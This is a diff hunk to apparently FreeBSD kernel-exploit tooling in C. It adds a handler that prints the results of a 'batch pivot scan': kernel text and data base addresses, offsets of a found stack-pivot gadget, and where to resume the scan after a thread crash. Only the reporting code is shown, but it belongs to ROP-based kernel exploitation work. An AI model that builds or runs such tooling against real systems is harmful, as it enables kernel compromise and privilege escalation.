@@ -509,6 +509,44 @@ static void _kldload(void* data, size_t data_size)
         }
 
         printf("\n=== END KTEXT MAP ===\n");
+    } else if (magic == 0x42505654) { /* "BPVT" - batch pivot scan */
+        uint32_t status = (uint32_t)(readback[0] >> 32);
+        uint64_t ktext_base = readback[2];
+        uint64_t scan_start = readback[3];
+        int scan_count = (int)readback[4];
+        int last_idx = (int)readback[5];
+        uint64_t found_off = readback[6];
+        uint64_t found_addr = readback[7];
+        int survived = (int)readback[8];
+        int tested = (int)readback[9];
+
+        printf("\n=== BATCH PIVOT SCAN RESULTS ===\n");
+        printf("  kdata_base:    %#lx\n", readback[1]);
+        printf("  ktext_base:    %#lx\n", ktext_base);
+        printf("  scan_start:    %#lx (ktext+%#lx)\n",
+               scan_start, scan_start - ktext_base);
+        printf("  scan_count:    %d\n", scan_count);
+        printf("  tested:        %d / %d\n", tested, scan_count);
+        printf("  survived:      %d\n", survived);
+        printf("  last_tested:   index %d (addr %#lx)\n",
+               last_idx, scan_start + last_idx);
+
+        if (status == 0x0002) {
+            printf("\n  >>> PIVOT GADGET FOUND! <<<\n");
+            printf("  Address: %#lx\n", found_addr);
+            printf("  Offset:  ktext+%#lx\n", found_off);
+            printf("  kdata offset: -0x%lx\n", ktext_base + 0xC00000 - found_addr);
+        } else if (status == 0x0001) {
+            printf("\n  Scan complete. No pivot found in this range.\n");
+        } else if (status == 0xAAAA) {
+            printf("\n  Thread died at index %d (addr %#lx ktext+%#lx)\n",
+                   last_idx, scan_start + last_idx,
+                   scan_start + last_idx - ktext_base);
+            printf("  Resume next scan from: ktext+%#lx\n",
+                   scan_start + last_idx + 1 - ktext_base);
+        }
+
+        printf("\n=== END BATCH PIVOT SCAN ===\n");
     } else {
         /* Generic readback - check for test markers */
         uint64_t val0 = readback[0];
